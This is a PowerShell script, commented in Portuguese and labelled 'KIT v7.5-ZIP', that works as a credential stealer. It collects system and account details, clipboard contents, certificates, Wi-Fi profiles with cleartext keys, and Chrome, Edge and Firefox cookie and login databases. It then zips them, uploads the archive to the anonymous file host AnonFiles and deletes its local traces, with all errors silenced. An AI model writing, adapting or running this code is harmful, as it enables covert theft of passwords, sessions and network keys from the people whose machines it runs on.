# KIT v7.5-ZIP  –  TXT legível + ZIP + upload AnonFiles
$ErrorActionPreference = 'SilentlyContinue'
Add-Type -AssemblyName System.IO.Compression.FileSystem   # zip built-in

$stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$work  = "$env:TEMP\kit_$stamp"
$zip   = "$env:TEMP\kit_$stamp.zip"
[IO.Directory]::CreateDirectory($work) | Out-Null

function Out-Kit ($name, $obj) {
    $file = Join-Path $work $name
    if ($obj -is [string]) { $obj | Set-Content $file -Encoding UTF8 }
    else { $obj | ConvertTo-Json -Depth 5 -Compress | Set-Content $file -Encoding UTF8 }
}

# ---------- 1) Sistema ----------
Out-Kit '01_systeminfo.txt' (systeminfo)
Out-Kit '02_ComputerSystem.json' (Get-CimInstance Win32_ComputerSystem)
Out-Kit '03_Processor.json'      (Get-CimInstance Win32_Processor)
Out-Kit '04_BIOS.json'           (Get-CimInstance Win32_BIOS)
Out-Kit '05_NetIP.json'          (Get-NetIPConfiguration)
Out-Kit '06_Users.json'          (Get-CimInstance Win32_UserAccount)
Out-Kit '07_Admins.txt'          (net localgroup administradores)
Out-Kit '08_Logon4624.json'      ( (Get-WinEvent @{LogName='Security';ID=4624;Max=100}) |
                                   Select TimeCreated,ID,Message )
Out-Kit '09_Clipboard.txt'       (Get-Clipboard -Raw)

# ---------- 2) Recent files ----------
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -File -EA 0 |
    Select Name,LastWriteTime,Length |
    ConvertTo-Json -Compress |
    Set-Content (Join-Path $work '10_RecentFiles.json') -Encoding UTF8

# ---------- 3) Certificados ----------
Get-ChildItem Cert:\CurrentUser\My -EA 0 |
    Select Subject,Thumbprint,NotAfter |
    ConvertTo-Json -Compress |
    Set-Content (Join-Path $work '11_Certs.json') -Encoding UTF8

# ---------- 4) Wi-Fi (XML com senha) ----------
$wifiDir = "$env:TEMP\wifi_$(Get-Random)"
[IO.Directory]::CreateDirectory($wifiDir) | Out-Null
netsh wlan export profile key=clear folder="$wifiDir" | Out-Null
Get-ChildItem $wifiDir -Filter *.xml -EA 0 | %{
    $dest = Join-Path $work ("12_WIFI_" + $_.Name)
    [IO.File]::Copy copy $_.FullName $dest
}
Remove-Item $wifiDir -Recurse -Force

# ---------- 5) Browsers – copia arquivos originais (leves desbloqueados) ----------
@(
    @{Name='Chrome';  P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default";   F=@('Cookies','Login Data','History','Web Data')},
    @{Name='Edge';    P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"; F=@('Cookies','Login Data','History','Web Data')},
    @{Name='Firefox'; P="$env:APPDATA\Mozilla\Firefox\Profiles";              F=@('cookies.sqlite','logins.json','places.sqlite','key4.db')}
) | %{
    $base = $_.P
    $_.F | %{
        $file = Get-ChildItem $base -Recurse -File -Name $_ -EA 0 | Select -First 1
        if($file){
            $src = Join-Path $base $file
            $dst = Join-Path $work ("13_" + $_.Name + "_" + [IO.Path]::GetFileName($src))
            try   { Copy-Item $src $dst -Force }
            catch { $dst += '.locked'; [Convert]::ToBase64String([IO.File]::ReadAllBytes($src)) | Set-Content $dst }
        }
    }
}

# ---------- 6) Compactar ----------
[IO.Compression.ZipFile]::CreateFromDirectory($work, $zip, 'Optimal', $false)

# ---------- 7) Upload AnonFiles ----------
try {
    $res = Invoke-RestMethod -Uri 'https://api.anonfiles.com/upload' -Method Post -Form @{ file = Get-Item -LiteralPath $zip }
    Write-Host "`nUpload OK – link:" -ForegroundColor Green
    $res.data.file.url.full
} catch {
    Write-Host "`nUpload falhou: $($_.Exception.Message)" -ForegroundColor Red
}

# ---------- 8) Limpar ----------
Remove-Item $work -Recurse -Force
Remove-Item $zip  -Force
